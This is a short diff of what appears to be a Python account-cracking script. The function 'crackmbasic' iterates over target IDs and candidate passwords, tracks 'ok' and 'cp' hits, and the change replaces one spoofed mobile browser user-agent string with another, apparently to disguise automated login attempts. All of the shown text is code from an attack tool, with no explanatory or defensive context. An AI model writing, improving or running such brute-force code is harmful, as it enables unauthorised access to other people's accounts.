@@ -573,7 +573,7 @@ def crackmbasic(idf,pwv):
 	pers = loop*100/len(id2)
 	fff = '%'
 	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
-	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.5 Safari/605.1.15 AlohaBrowser/4.2.1'
+	ua = 'Mozilla/5.0 (Linux; Android 10; SM-A605G Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.111 NoxBrowser/2.0.0 Mobile Safari/537.36'
 	ua2 = random.choice(ugen2)
 	ses = requests.Session()
 	for pw in pwv:
